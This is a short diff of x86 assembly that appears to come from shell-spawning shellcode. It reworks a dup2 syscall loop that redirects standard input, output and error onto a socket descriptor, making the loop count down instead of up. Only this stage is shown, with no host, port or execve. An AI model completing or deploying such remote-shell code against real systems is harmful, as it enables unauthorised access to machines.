@@ -51,14 +51,14 @@ _start:
 
   ; dup2
   mov ebx, eax
-  push BYTE 0x0 
+  push BYTE 0x2 
   pop ecx
   mov BYTE al, 0x3F ; dup2  syscall 63
   int 0x80
-  inc ecx
+  dec ecx
   mov BYTE al, 0x3F
   int 0x80
-  inc ecx
+  dec ecx
   mov BYTE al, 0x3F
   int 0x80 
   
